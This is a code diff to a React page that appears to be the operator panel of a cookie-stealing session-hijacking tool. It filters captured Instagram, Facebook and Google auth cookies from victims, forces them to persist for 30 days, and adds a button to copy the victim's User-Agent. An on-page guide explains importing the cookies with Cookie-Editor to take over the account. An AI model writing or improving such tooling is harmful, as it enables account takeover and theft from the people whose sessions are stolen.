@@ -41,6 +41,7 @@ export default function SessionsPage() {
   const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
   const [copied, setCopied] = useState(false);
   const [copiedJson, setCopiedJson] = useState(false);
+  const [copiedUA, setCopiedUA] = useState(false);
   const [showGuide, setShowGuide] = useState(false);
 
   useEffect(() => {
@@ -234,61 +235,52 @@ export default function SessionsPage() {
     const info = accountMap[selectedSession.id];
     const mainPrimaryDomain = info?.domain.toLowerCase() || "";
     
-    // NOISE BLACKLIST: These cookies cause errors or are useless for auth
     const blacklist = ["fr", "tr", "_fbp", "ar_debug", "_ga", "_gid", "_gat", "__utma", "__utmb", "__utmc", "__utmt", "__utmz", "test_cookie"];
 
-    // SMART FILTER: Only export cookies strictly relevant to the platform
     const filteredCookies = cookies.filter(c => {
       const name = c.name;
       const d = c.domain.toLowerCase();
-      
-      // 1. Skip blacklisted cookies
       if (blacklist.some(b => b === name || name.startsWith(b + "."))) return false;
 
-      // 2. Platform-specific domain strictness
       if (mainPrimaryDomain.includes("instagram.com")) {
-          // Instagram: Only allow .instagram.com and essential .facebook.com
           if (d.includes("instagram.com")) return true;
-          // Only allow FB cookies if they look like auth tokens
           if (d.includes("facebook.com") && (name === "c_user" || name === "xs" || name === "datr")) return true;
           return false;
       }
-      
       if (mainPrimaryDomain.includes("facebook.com")) {
           if (d.includes("facebook.com") || d.includes("messenger.com")) return true;
           return false;
       }
-
       if (mainPrimaryDomain.includes("google.com") || mainPrimaryDomain.includes("youtube.com")) {
           if (d.includes("google.com") || d.includes("youtube.com")) return true;
           return false;
       }
-
-      // Default: Match primary domain or be very restrictive
-      if (d.includes(mainPrimaryDomain)) return true;
-      
-      // Fallback for unidentified: Only allow current domain or small sets
-      return cookies.length < 10;
+      return d.includes(mainPrimaryDomain) || cookies.length < 10;
     });
 
     const formatted = filteredCookies.map(c => {
       const isHostPrefix = c.name.startsWith("__Host-");
       const isSecurePrefix = c.name.startsWith("__Secure-");
       
-      // Map SameSite: "no_restriction" is most compatible for cross-domain imports
       let sameSite = (c.same_site?.toLowerCase() || "no_restriction").replace("-", "_");
       if (sameSite === "unspecified") sameSite = "no_restriction";
 
+      // PERSISTENCE FIX: If expiration is missing or very short, force 30 days
+      const thirtyDays = Math.floor(Date.now() / 1000) + 86400 * 30;
+      const expiration = c.expiration_date && c.expiration_date > (Date.now() / 1000) + 3600 
+        ? Math.floor(c.expiration_date) 
+        : thirtyDays;
+
       return {
         domain: isHostPrefix ? "" : (c.domain.startsWith(".") ? c.domain : "." + c.domain),
-        expirationDate: c.expiration_date ? Math.floor(c.expiration_date) : undefined,
+        expirationDate: expiration,
         hostOnly: isHostPrefix ? true : !c.domain.startsWith("."),
         httpOnly: c.http_only,
         name: c.name,
         path: isHostPrefix ? "/" : (c.path || "/"),
         sameSite: sameSite,
         secure: (isHostPrefix || isSecurePrefix) ? true : c.secure,
-        session: c.is_session,
+        session: false, // Force false to ensure it's not treated as temporary
         storeId: c.store_id || "0",
         value: c.value
       };
@@ -421,10 +413,10 @@ export default function SessionsPage() {
                 </div>
                 <div className="space-y-8">
                   {[
-                    { step: "01", title: "Emulate Environment", desc: "Copy the original User-Agent and apply it using 'User-Agent Switcher' extension." },
-                    { step: "02", title: "Target Domain", desc: "Navigate to the site (e.g., instagram.com) to establish the context." },
-                    { step: "03", title: "Deep Injection", desc: "Use the 'JSON Method' with 'Cookie-Editor' for full HttpOnly bypass." },
-                    { step: "04", title: "Execute Restoration", desc: "Refresh the page. If the session persists, you have successfully mirrored the ID." }
+                    { step: "01", title: "Match User-Agent", desc: "Use 'User-Agent Switcher' extension. Paste the exact UA captured in the panel." },
+                    { step: "02", title: "Clean Start", desc: "Open a new tab at the target site (e.g., instagram.com) BEFORE importing." },
+                    { step: "03", title: "Import Clone", desc: "In Cookie-Editor, use 'Import' and paste the Safe JSON. Click 'Import' again." },
+                    { step: "04", title: "Persistence", desc: "Refresh the page. The session should be recognized as a local 1:1 mirror." }
                   ].map((item, idx) => (
                     <div key={idx} className="flex gap-6 items-start">
                       <div className="text-3xl font-black text-white/5 select-none">{item.step}</div>
@@ -467,6 +459,17 @@ export default function SessionsPage() {
                                 <Monitor size={20} /> CRYPTOGRAPHIC SIGNATURE (UA)
                             </div>
                             {selectedSession.user_agent && <div className="text-[10px] font-black text-emerald-400">MATCH VALIDATED</div>}
+                            <button 
+                                onClick={() => {
+                                    navigator.clipboard.writeText(selectedSession.user_agent || "");
+                                    setCopiedUA(true);
+                                    setTimeout(() => setCopiedUA(false), 3000);
+                                }}
+                                className="px-3 py-1.5 rounded-xl bg-blue-500/20 text-blue-400 hover:bg-blue-500/30 transition-all flex items-center gap-2 group border border-blue-500/20"
+                            >
+                                {copiedUA ? <Check size={12} /> : <Copy size={12} />}
+                                {copiedUA ? "COPIED" : "COPY UA"}
+                            </button>
                         </div>
                         {selectedSession.user_agent ? (
                           <div className="text-xs font-mono text-gray-500 break-all leading-relaxed bg-black/60 p-6 rounded-3xl border border-white/5 shadow-2xl">
